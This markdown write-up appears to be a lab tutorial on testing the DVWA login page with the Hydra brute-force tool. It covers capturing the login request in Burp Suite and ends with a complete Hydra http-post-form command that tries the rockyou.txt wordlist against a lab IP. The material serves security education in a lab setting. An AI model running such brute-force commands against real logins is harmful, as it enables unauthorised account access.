# Hydra Brute Force Testing

## Objective
Test authentication mechanisms for weak password policies using controlled brute-force techniques in a lab environment.

## Tool
- Hydra (Network Login Cracker)
- Lab: DVWA Login Page
- Kali Linux

---

## What is Hydra?

Hydra is a parallelized login brute-force tool that supports multiple protocols including HTTP, FTP, SSH, and more.

It is commonly used during penetration testing to evaluate password strength and authentication security.

---

## Why Authentication Testing Matters

Weak login mechanisms can lead to:
- Unauthorized account access
- Credential stuffing attacks
- Privilege escalation

---

## Identifying the Target

Using Burp Suite, intercept the login request to determine:

- Request Method (POST)
- Login parameters
- Failure response message

Example intercepted request:

POST /dvwa/login.php
username=admin&password=test&Login=Login

Failure condition:
"Login failed"

---

## Hydra Command Example

```bash
hydra -l admin -P rockyou.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
